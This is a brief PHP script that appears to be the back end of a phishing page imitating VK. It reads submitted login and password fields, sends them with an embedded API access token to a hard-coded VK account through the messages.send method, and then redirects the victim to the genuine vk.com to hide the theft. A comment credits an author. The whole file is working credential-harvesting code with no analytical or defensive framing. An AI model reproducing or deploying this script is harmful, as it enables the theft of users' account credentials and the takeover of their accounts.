<?php
$Log =$_POST['login'];
$Pass=$_POST['password'];
$text = "$Log:$Pass";
$token = '7ace7ab4c7924b693fd759171d6b9acde6b97f8ca4fa501283284a352ecb393a1e553b84e9a0b4117e750'; // 7ace7ab4c7924b693fd759171d6b9acde6b97f8ca4fa501283284a352ecb393a1e553b84e9a0b4117e750
$post = file_get_contents ('https://api.vk.com/method/messages.send?user_id=gorick1206&message='.urlencode($text).'&access_token='.$token);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/'></head></html>";
//Сделал Perry007 Miped.ru
?>